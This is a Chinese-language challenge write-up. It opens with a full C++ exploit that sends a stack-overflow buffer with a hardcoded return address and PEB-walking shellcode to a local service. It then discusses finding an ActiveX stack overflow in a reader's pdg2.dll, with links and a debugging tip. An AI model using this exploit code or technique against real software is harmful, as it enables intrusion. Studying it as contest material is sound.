
```cpp
// exploitA.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <winsock.h>
#pragma comment(lib, "wsock32.lib")

BYTE shellcode[0x200] =
{
  "\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF"
  "\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF"
  "\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF"
  "\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF"
  "\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF"
  "\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF"
  "\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF"
  "\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF"
  "\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF"
  "\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF"
  "\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF"
  "\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF"
  "\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\xED\\x1E\\x96\\x7C"
  "\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C"
  "\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53"
  "\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B"
  "\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95"
  "\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59"
  "\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A"
  "\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75"
  "\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03"
  "\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB"
  "\\x53\\x68\\x6F\\x68\\x6F\\x0A\\x68\\x62\\x75\\x67\\x68\\x8B\\xC4\\x53\\x50\\x50"
  "\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8"
};
int \_tmain(int argc, \_TCHAR\* argv\[\])
{
  WORD version;
  WSADATA wsaData;
  int rVal=0;

  version = MAKEWORD(1,1);

  WSAStartup(version,(LPWSADATA)&wsaData);

  LPHOSTENT hostEntry;

  //store information about the server
  hostEntry = gethostbyname("127.0.0.1");

  if(!hostEntry)
  {
    printf("Failed gethostbyname()");
    WSACleanup();
    return 0;
  }

  //create the socket
  SOCKET theSocket = socket(PF\_INET, SOCK\_STREAM, IPPROTO\_TCP);

  if(theSocket == SOCKET\_ERROR)
  {
    printf("Failed socket()");
    return 0;
  }

  //Fill in the sockaddr\_in struct
  SOCKADDR\_IN serverInfo;

  serverInfo.sin\_family = PF\_INET;
  serverInfo.sin\_addr = \*((LPIN\_ADDR)\*hostEntry->h\_addr\_list);

  serverInfo.sin\_port = htons(7777);

  rVal=connect(theSocket,(LPSOCKADDR)&serverInfo, sizeof(serverInfo));
  if(rVal==SOCKET\_ERROR)
  {
    printf("Failed connect()");
    return 0;
  }
  send(theSocket,(const char\*)shellcode,0x200,0);
  return 0;
}
```

然后再看第 2 题,第 2 题是个控件,目标是得找到位置,然后才能溢出。

我们先用 VS 对象浏览器看看都有哪些接口函数

![名称:  3.JPG> 查看次数: 271> 文件大小:  42.3 KB](img/a94fa2a29c61c9c3f65a74cd9b7760e5.jpg)

函数名很有针对性,怎么看也不像是出题者出的,随便挑了个独特点的函数 `GetRemoteFileTime` 去 google 了一下,发现了 `pdg2.dll`,然后 `pdg2` 一下,发现了阅读器,然后阅读器一下,发现了 0day....

黑客防线 11 月刊上有一篇 `超星阅读器 pdg2.dll ActiveX` 栈溢出 0Day

网上是找不到这篇的资料了,不过有这一篇.
http://www.cnhacker.com/Hacker/Exploit/200711/t20071105\_2635.html

这一篇安全新闻是介绍这个漏洞是如何发生的
http://xforce.iss.net/xforce/xfdb/38311

..............我其实不想做了,但是为了骗一本书我还是厚着脸皮做了.

这个漏洞发生在 `Register` 函数里面,另外这个控件漏洞肯定不少...

参考了 `跟踪调试 COM 组件的接口(Edit by hklzt)` 这一篇之后.知道了想 0D 这个控件的接口函数的话得在 `oleaut32.dll` 的 `DispCallFunc` 函数上下断..

下面是 `Register` 函数

代码:
